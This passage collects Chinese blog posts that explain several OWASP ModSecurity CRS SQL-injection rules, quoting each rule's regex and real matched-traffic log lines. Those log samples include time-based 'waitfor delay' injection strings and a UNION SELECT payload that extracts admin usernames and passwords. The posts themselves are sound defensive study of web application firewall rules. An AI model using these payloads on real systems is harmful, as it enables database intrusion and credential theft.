<h3 id="规则配置文件"><a href="#规则配置文件" class="headerlink" title="规则配置文件"></a>规则配置文件</h3><p>我直接从<a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">github</a>下载了<code>owasp-modsecurity-crs-3.3</code>的源码。<br>规则配置文件位于：<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\rules\REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></p>
<details><summary>点击展开ruleid=942240的配置内容</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Regexp generated from util/regexp-assemble/regexp-942240.data using Regexp::Assemble.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To rebuild the regexp:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   <span class="built_in">cd</span> util/regexp-assemble</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   ./regexp-assemble.pl regexp-942240.data</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note that after assemble an outer bracket with an ignore <span class="keyword">case</span> flag is added</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to the Regexp::Assemble output:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   (?i:ASSEMBLE_OUTPUT)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash">SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* <span class="string">&quot;@rx (?i:(?:[\&quot;&#x27;`](?:;*?\s*?waitfor\s+(?:delay|time)\s+[\&quot;&#x27;`]|;.*?:\s*?goto)|alter\s*?\w+.*?cha(?:racte)?r\s+set\s+\w+))&quot;</span> \</span></span><br><span class="line"><span class="bash">    <span class="string">&quot;id:942240,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    phase:2,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    block,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    capture,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    t:none,t:urlDecodeUni,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    msg:&#x27;Detects MySQL charset switch and MSSQL DoS attempts&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;application-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;language-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;platform-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;attack-sqli&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;paranoia-level/1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;WASCTC/WASC-19&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_TOP_10/A1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_AppSensor/CIE1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;PCI/6.5.2&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    severity:&#x27;CRITICAL&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span></span></span><br></pre></td></tr></table></figure>

</p>
</details>

<p>这条规则的正则表达式由<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\util\regexp-assemble\regexp-942240.data</code>生成。</p>
<details><summary>点击展开regexp-942240.data</summary>
<p>

<figure class="highlight re"><table><tr><td class="code"><pre><span class="line">alter\s*?\w+.*?character\s+set\s+\w+</span><br><span class="line">alter\s*?\w+.*?<span class="built_in">char</span>\s+set\s+\w+</span><br><span class="line"><span class="literal">[\&quot;&#x27;`]</span>;*?\s*?waitfor\s+time\s+<span class="literal">[\&quot;&#x27;`]</span></span><br><span class="line"><span class="literal">[\&quot;&#x27;`]</span>;*?\s*?waitfor\s+delay\s+<span class="literal">[\&quot;&#x27;`]</span></span><br><span class="line"><span class="literal">[\&quot;&#x27;`]</span>;.*?:\s*?goto</span><br></pre></td></tr></table></figure>

</p>
</details>

<p><code>msg:&#39;Detects MySQL charset switch and MSSQL DoS attempts&#39;</code>这条规则用于检测mysql字符转换和MSSQL Dos尝试。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: &#x27;; waitfor delay &#x27; found within ARGS:activityId: 27)&#x27;; waitfor delay &#x27;0:0:2&#x27; --</span><br></pre></td></tr></table></figure>
<p>匹配的变量是post参数（ARGS），参数名称是<code>activityId</code>，匹配的数据是<code>&#39;; waitfor delay &#39;</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gd2wx55g4bj30j00683ym.jpg" alt="image.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单的规则。</p>
]]></content>
      <categories>
        <category>Modsecurity</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>crs防护规则</tag>
        <tag>SQL注入</tag>
        <tag>ruleid=942240</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity防护crs规则学习之SQL注入-ruleid=942230</title>
    <url>//posts/ZH-CN/Modsecurity-Crs-Rules-SQLInjection-Ruleid-942230.html</url>
    <content><![CDATA[<h2 id="防护规则学习之SQL注入"><a href="#防护规则学习之SQL注入" class="headerlink" title="防护规则学习之SQL注入"></a>防护规则学习之SQL注入</h2><div class="note info">
            <ul><li>攻击类型：注入攻击</li><li>ruleid: 942230</li></ul>
          </div>

<p><escape> <span id="more"></span></escape></p>
<h3 id="规则配置文件"><a href="#规则配置文件" class="headerlink" title="规则配置文件"></a>规则配置文件</h3><p>我直接从<a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">github</a>下载了<code>owasp-modsecurity-crs-3.3</code>的源码。<br>规则配置文件位于：<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\rules\REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></p>
<details><summary>点击展开ruleid=942230的配置内容</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* &quot;@rx (?i:[\s()]case\s*?\(|\)\s*?like\s*?\(|having\s*?[^\s]+\s*?[^\w\s]|if\s?\([\d\w]\s*?[=&lt;&gt;~])&quot; \</span><br><span class="line">    &quot;id:942230,\</span><br><span class="line">    phase:2,\</span><br><span class="line">    block,\</span><br><span class="line">    capture,\</span><br><span class="line">    t:none,t:urlDecodeUni,\</span><br><span class="line">    msg:&#x27;Detects conditional SQL injection attempts&#x27;,\</span><br><span class="line">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span><br><span class="line">    tag:&#x27;application-multi&#x27;,\</span><br><span class="line">    tag:&#x27;language-multi&#x27;,\</span><br><span class="line">    tag:&#x27;platform-multi&#x27;,\</span><br><span class="line">    tag:&#x27;attack-sqli&#x27;,\</span><br><span class="line">    tag:&#x27;paranoia-level/1&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_CRS&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span><br><span class="line">    tag:&#x27;WASCTC/WASC-19&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_TOP_10/A1&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_AppSensor/CIE1&#x27;,\</span><br><span class="line">    tag:&#x27;PCI/6.5.2&#x27;,\</span><br><span class="line">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span><br><span class="line">    severity:&#x27;CRITICAL&#x27;,\</span><br><span class="line">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span><br><span class="line">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span><br></pre></td></tr></table></figure>

</p>
</details>

<p>匹配规则：</p>
<figure class="highlight re"><table><tr><td class="code"><pre><span class="line">(?i:<span class="literal">[\<span class="identifier">s</span>()]</span>case\s*?\(<span class="pattern-match">|\)\s<span class="operator">*</span>?like\s<span class="operator">*</span>?\(|having\s<span class="operator">*</span>?[^\s]+\s<span class="operator">*</span>?[^\w\s]|<span class="keyword">if</span>\s?\([\d\w]\s<span class="operator">*</span>?[=&lt;&gt;~])</span></span><br></pre></td></tr></table></figure>

<p><code>msg:&#39;Detects conditional SQL injection attempts&#39;</code>这条规则检测条件式SQL注入的尝试。像<code>case</code>、<code>like</code>、<code>having</code>、<code>if</code>这些关键字就是条件式的SQL语法。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul>
<li>例子1：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: HavinGQZxeoAnAjGb5Tbcwz2T1qAmuJK73rqizh2KlsDD4a762L2662KzhMLW1oGG0gvd4daqnHae0f27wqXVn/vLwDp52/ found within ARGS:padimg: &lt;?xml version=\x221.0\x22 encoding=\x22UTF-8\x22?&gt;&lt;BJCAROOT&gt;&lt;Version&gt;1&lt;/Version&gt;&lt;SignTID&gt;1122&lt;/SignTID&gt;&lt;EncKey&gt;bm4Ppg2N6pHJ24kpS1BHJ0d8UlLu3nKsbpOZ8c9TjGZtGLqqGWPXyolcIVTGnrfgzKZXYIkPWKREMFpqoujPoaCV0s/CSOQLqHjYc06gXsh7Imzwwy8p36ojyhv6A8j w8Jxuj0PDHYTBTXP3yVszrEfBe7pYtyF1uSH59444zw=&lt;/EncKey&gt;&lt;Cert&gt;&lt;EncCertSN&gt;102105000006752389&lt;/EncCertSN&gt;&lt;EncCertKeyID&gt;N/A&lt;/EncCertKeyID&gt;&lt;EncAlg&gt;1&lt;/EncAlg&gt;&lt;/Cert&gt;&lt;EncData&gt;yNvts2rPTUFjCUVCCHPzqqMWrTJeqrJIpUTmhhSs3zDihU6BjLTv0KsDpkvj0EhE4D7RL/5YEpPCk3gNWp3WKQJQoPdkSmKmBKP85SgqAG6yN G mK0lBbnXgUsm8P9E8b72yMeLmrMzVrOwZDz49MeGzKoqaLzLAhxhypsP9kMPDkuZc9EepR5i/ LWnN/Qw C8eepwvZOh3zsoPPNoY9TThBVbHIsp3iFDe5yQ3Y6tKLM7ihAUDIlTHXc85ffplOeMJFQredULgGAcBte2cGPQ B0C3BvehKdZCsqPzdlSNSDHsU0yiK/vFJAbR/QopPrAKjYsfhCw/IZc wdDSbkC5vmKyFNHROsrPIkMBhV0WCnyowr4iIijqK 7Mq0MQJ0uGw2xaf 4NKf1LEtPaybvjxpMb/rWouIbc/s4Zm6g7wFfHYh7/e8kMLoqPGBQ4AlI9t8JQMknycvUOSi0qEcSXJeemny3woqBAMTiEhrBAxRc54f2wQsD92Ijyn1/5 pyxURjuUrSjNVPwJAp68vVrAwx5KrTu6tVmX/RqcddpJkF58arkqbGRAMtIlCgDF5syEnr7UV7Iiv4mKyWN/3r95dADM6iSy9jBRe5GzOdbSiI81fHlmi1l83I39cKTgajqoRD0ONr1qxFpmjk0D1/kLHUmKwVAZTQm OyZ1Hj5YEty3IkDxi gaZjWi86x3QqUCNDc1rygaTB/QOTn2x1mvd5CfUTuwi hhNm2dU3r0FDJXhI8ObGnBcIoFf6Hb4F8I/ezRQSlyOb6tG Z3EV2nqCsFgwOVL9baefpPFnERxysrK1Oc5i2SMHpdhyM4s2W/hYImnLCM2sNmmu1iA5Jc/3eL73MKA6TosrcVBo8ECl20atja6oCht/lWiQinAkKfRUDlHBJ/zjK8vEo4Jis5Gwpo4BtC9doETTrf2W5zjFKZjnHByq7pbfDa0jmtg6aA54Qy/z2JhHMFg3iPeig0kpbOI9kZkmBshC2ia uKtlXiAbthcazWEycuDnISXXGacjKS4GZ49zPMbS9KzoOZMsVT1Y yADLWf3ZDodsYxFoXR8tzAI02ZeaT6RLvg46iTL3Qkvhs3d rC/aJbHmSWY2EiocB9l7UzArve0ZEBSZKEQGCmO8fDNmRHHnnxDVRNcm0DKGYOF9z0faynk5UnBXoLyTDURP/HpULG5L4HaYr7lDWbLCzJurV1ovkuMeCvlGZ5drNGKBhBH60P4Cq8O5fHSCmUtFbV75SjAoHlGg/LUF2iHD3kvBwZSnHqg8AgMcMoQQpcLdDhDe9wLDWt574apt803fhWD9IHtzPokolc HbzTUfZvggd0agpFLV0Q2fD3V46ft1SMVhh5PhM 8TOX01df9D7nQonMIcRogYYg4h1VeM 7WSVh75vABa9O9/wyFaJ JkY7v4J3lMT5G1o47Yb4Nl/8yf1nAjMM9iUAmptlq1c8YbCjNGTfWOaJ3Dctf9Zeog02G2wfrdgWQSFby7</span><br></pre></td></tr></table></figure>
匹配的变量是post提交参数（ARGS），参数名称是<code>padimg</code>，匹配的数据是<code>HavinGQZxeoAnAjGb5Tbcwz2T1qAmuJK73rqizh2KlsDD4a762L2662KzhMLW1oGG0gvd4daqnHae0f27wqXVn/vLwDp52/</code>。<br>也就是匹配到了关键字<code>having</code>。</li>
<li>例子2：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: if(a= found within ARGS:source: &#123;\x22size\x22:1,\x22query\x22:&#123;\x22filtered\x22:&#123;\x22query\x22:&#123;\x22match_all\x22:&#123;&#125;&#125;&#125;&#125;,\x22script_fields\x22:&#123;\x22b9b7dd1c421e005bc9a7f70b848e3d0e\x22:&#123;\x22script\x22:\x22import java.util.*;\x5cnimport java.io.*;\x5cna=\x5c\x221\x5c\x22;\x5cnif(a==\x5c\x221\x5c\x22)\x5cnreturn \x5c\x22098f6bcd4621d373cade4e832627b4f6\x5c\x22;\x22&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
匹配的变量是post提交参数（ARGS），参数名称是<code>source</code>，匹配的数据是<code>if(a=</code>。匹配的关键字就是<code>if</code>。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>easy。但是这个规则容易误拦截，尤其是<code>if</code>就只有两个字符，那些经过编码的数据很容易匹配到这个关键字。</p>
]]></content>
      <categories>
        <category>Modsecurity</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>crs防护规则</tag>
        <tag>SQL注入</tag>
        <tag>ruleid=942230</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity防护crs规则学习之SQL注入-ruleid=942270</title>
    <url>//posts/ZH-CN/Modsecurity-Crs-Rules-SQLInjection-Ruleid-942270.html</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续学习SQL注入规则。</p>
<p><escape> <span id="more"></span></escape></p>
<h2 id="防护规则学习之SQL注入"><a href="#防护规则学习之SQL注入" class="headerlink" title="防护规则学习之SQL注入"></a>防护规则学习之SQL注入</h2><div class="note info">
            <ul><li>攻击类型：注入攻击</li><li>ruleid: 942270</li></ul>
          </div>
<h3 id="规则配置文件"><a href="#规则配置文件" class="headerlink" title="规则配置文件"></a>规则配置文件</h3><p>我直接从<a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">github</a>下载了<code>owasp-modsecurity-crs-3.3</code>的源码。<br>规则配置文件位于：<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\rules\REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></p>
<details><summary>点击展开ruleid=942270的配置内容</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* &quot;@rx (?i)union.*?select.*?from&quot; \</span><br><span class="line">    &quot;id:942270,\</span><br><span class="line">    phase:2,\</span><br><span class="line">    block,\</span><br><span class="line">    capture,\</span><br><span class="line">    t:none,t:urlDecodeUni,\</span><br><span class="line">    msg:&#x27;Looking for basic sql injection. Common attack string for mysql, oracle and others&#x27;,\</span><br><span class="line">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span><br><span class="line">    tag:&#x27;application-multi&#x27;,\</span><br><span class="line">    tag:&#x27;language-multi&#x27;,\</span><br><span class="line">    tag:&#x27;platform-multi&#x27;,\</span><br><span class="line">    tag:&#x27;attack-sqli&#x27;,\</span><br><span class="line">    tag:&#x27;paranoia-level/1&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_CRS&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span><br><span class="line">    tag:&#x27;WASCTC/WASC-19&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_TOP_10/A1&#x27;,\</span><br><span class="line">    tag:&#x27;OWASP_AppSensor/CIE1&#x27;,\</span><br><span class="line">    tag:&#x27;PCI/6.5.2&#x27;,\</span><br><span class="line">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span><br><span class="line">    severity:&#x27;CRITICAL&#x27;,\</span><br><span class="line">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span><br><span class="line">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span><br></pre></td></tr></table></figure>

</p>
</details>

<p>匹配的规则是：</p>
<figure class="highlight re"><table><tr><td class="code"><pre><span class="line">(?i)union.*?select.*?from</span><br></pre></td></tr></table></figure>

<p><code>msg:&#39;Looking for basic sql injection. Common attack string for mysql, oracle and others&#39;</code>这条规则匹配的是基础sql注入，包括mysql, oracle和其他数据库的常用攻击字符串。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><ul>
<li>例子<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from found within ARGS:_FILES[type][tmp_name]: \x5c&#x27; or mid=@`\x5c&#x27;` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from `#@__admin` limit 0,1),5,6,7,8,9#@`\x5c&#x27;`</span><br></pre></td></tr></table></figure>
匹配的变量是post提交的参数（ARGS），参数名称是<code>_FILES[type][tmp_name]</code>，匹配到规则的数据是<code>union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,pwd) from</code>。<br>命中了规则：<code>(?i)union.*?select.*?from</code></li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这条规则相对简单。</p>
]]></content>
      <categories>
        <category>Modsecurity</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>crs防护规则</tag>
        <tag>SQL注入</tag>
        <tag>ruleid=942270</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity防护crs规则学习之SQL注入-ruleid=942280</title>
    <url>//posts/ZH-CN/Modsecurity-Crs-Rules-SQLInjection-Ruleid-942280.html</url>
    <content><![CDATA[<h2 id="防护规则学习之SQL注入"><a href="#防护规则学习之SQL注入" class="headerlink" title="防护规则学习之SQL注入"></a>防护规则学习之SQL注入</h2><div class="note info">
            <ul><li>攻击类型：注入攻击</li><li>ruleid: 942280</li></ul>
          </div>

<p><escape> <span id="more"></span></escape></p>
<h3 id="规则配置文件"><a href="#规则配置文件" class="headerlink" title="规则配置文件"></a>规则配置文件</h3><p>我直接从<a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">github</a>下载了<code>owasp-modsecurity-crs-3.3</code>的源码。<br>规则配置文件位于：<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\rules\REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></p>
<details><summary>点击展开ruleid=942280的配置内容</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Regexp generated from util/regexp-assemble/regexp-942280.data using Regexp::Assemble.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To rebuild the regexp:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   <span class="built_in">cd</span> util/regexp-assemble</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   ./regexp-assemble.pl regexp-942280.data</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note that after assemble an outer bracket with an ignore <span class="keyword">case</span> flag is added</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to the Regexp::Assemble output:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   (?i:ASSEMBLE_OUTPUT)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash">SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* <span class="string">&quot;@rx (?i:(?:;\s*?shutdown\s*?(?:[#;]|\/\*|--|\&#123;)|waitfor\s*?delay\s?[\&quot;&#x27;`]+\s?\d|select\s*?pg_sleep))&quot;</span> \</span></span><br><span class="line"><span class="bash">    <span class="string">&quot;id:942280,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    phase:2,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    block,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    capture,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    t:none,t:urlDecodeUni,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    msg:&#x27;Detects Postgres pg_sleep injection, waitfor delay attacks and database shutdown attempts&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;application-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;language-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;platform-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;attack-sqli&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;paranoia-level/1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_CRS/WEB_ATTACK/SQL_INJECTION&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;WASCTC/WASC-19&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_TOP_10/A1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;OWASP_AppSensor/CIE1&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;PCI/6.5.2&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    ver:&#x27;OWASP_CRS/3.2.0&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    severity:&#x27;CRITICAL&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.sql_injection_score=+%&#123;tx.critical_anomaly_score&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    setvar:&#x27;tx.anomaly_score_pl1=+%&#123;tx.critical_anomaly_score&#125;&#x27;&quot;</span></span></span><br></pre></td></tr></table></figure>

</p>
</details>

<p>这条规则的正则表达式是由<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\util\regexp-assemble\regexp-942280.data</code>生成的。</p>
<details><summary>点击展开regexp-942280.data</summary>
<p>

<figure class="highlight re"><table><tr><td class="code"><pre><span class="line">select\s*?pg_sleep</span><br><span class="line">waitfor\s*?delay\s?<span class="literal">[\&quot;&#x27;`]</span>+\s?\d</span><br><span class="line">;\s*?shutdown\s*?;</span><br><span class="line">;\s*?shutdown\s*?--</span><br><span class="line">;\s*?shutdown\s*?#</span><br><span class="line">;\s*?shutdown\s*?\/\*</span><br><span class="line">;\s*?shutdown\s*?&#123;</span><br></pre></td></tr></table></figure>

</p>
</details>

<p><code>msg:&#39;Detects Postgres pg_sleep injection, waitfor delay attacks and database shutdown attempts&#39;</code>这条规则是检测Postgres pg_sleep注入，waitfor延迟攻击以及关闭数据库的尝试。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Matched Data: waitfor delay&#x27;0 found within ARGS_NAMES:1,0)waitfor delay&#x27;0:0:20&#x27;--: 1,0)waitfor delay&#x27;0:0:20&#x27;--</span><br></pre></td></tr></table></figure>
<p>匹配的变量是参数名称（ARGS_NAMES），匹配的数据是<code>waitfor delay&#39;0</code>。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>也是简单的关键字匹配。</p>
]]></content>
      <categories>
        <category>Modsecurity</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>modsecurity</tag>
        <tag>crs防护规则</tag>
        <tag>SQL注入</tag>
        <tag>ruleid=942280</tag>
      </tags>
  </entry>
  <entry>
    <title>modsecurity防护crs规则学习之SQL注入-ruleid=942350</title>
    <url>//posts/ZH-CN/Modsecurity-Crs-Rules-SQLInjection-Ruleid-942350.html</url>
    <content><![CDATA[<h2 id="防护规则学习之SQL注入"><a href="#防护规则学习之SQL注入" class="headerlink" title="防护规则学习之SQL注入"></a>防护规则学习之SQL注入</h2><div class="note info">
            <ul><li>攻击类型：注入攻击</li><li>ruleid: 942350</li></ul>
          </div>

<p><escape> <span id="more"></span></escape></p>
<h3 id="规则配置文件"><a href="#规则配置文件" class="headerlink" title="规则配置文件"></a>规则配置文件</h3><p>我直接从<a href="https://github.com/SpiderLabs/owasp-modsecurity-crs">github</a>下载了<code>owasp-modsecurity-crs-3.3</code>的源码。<br>规则配置文件位于：<code>F:\学习资料\owasp-modsecurity-crs-3.3-dev\owasp-modsecurity-crs-3.3-dev\rules\REQUEST-942-APPLICATION-ATTACK-SQLI.conf</code></p>
<details><summary>点击展开ruleid=942350的配置内容</summary>
<p>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Regexp generated from util/regexp-assemble/regexp-942350.data using Regexp::Assemble.</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> To rebuild the regexp:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   <span class="built_in">cd</span> util/regexp-assemble</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   ./regexp-assemble.pl regexp-942350.data</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Note that after assemble an outer bracket with an ignore <span class="keyword">case</span> flag is added</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> to the Regexp::Assemble output:</span></span><br><span class="line"><span class="meta">#</span><span class="bash">   (?i:ASSEMBLE_OUTPUT)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"></span></span><br><span class="line"><span class="bash">SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/|REQUEST_COOKIES_NAMES|ARGS_NAMES|ARGS|XML:/* <span class="string">&quot;@rx (?i:(?:;\s*?(?:(?:(?:trunc|cre|upd)at|renam)e|(?:inser|selec)t|de(?:lete|sc)|alter|load)\b\s*?[\[(]?\w&#123;2,&#125;|create\s+function\s+.+\s+returns))&quot;</span> \</span></span><br><span class="line"><span class="bash">    <span class="string">&quot;id:942350,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    phase:2,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    block,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    capture,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    t:none,t:urlDecodeUni,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    msg:&#x27;Detects MySQL UDF injection and other data/structure manipulation attempts&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    logdata:&#x27;Matched Data: %&#123;TX.0&#125; found within %&#123;MATCHED_VAR_NAME&#125;: %&#123;MATCHED_VAR&#125;&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;application-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    tag:&#x27;language-multi&#x27;,\</span></span></span><br><span class="line"><span class="string"><span class="bash">    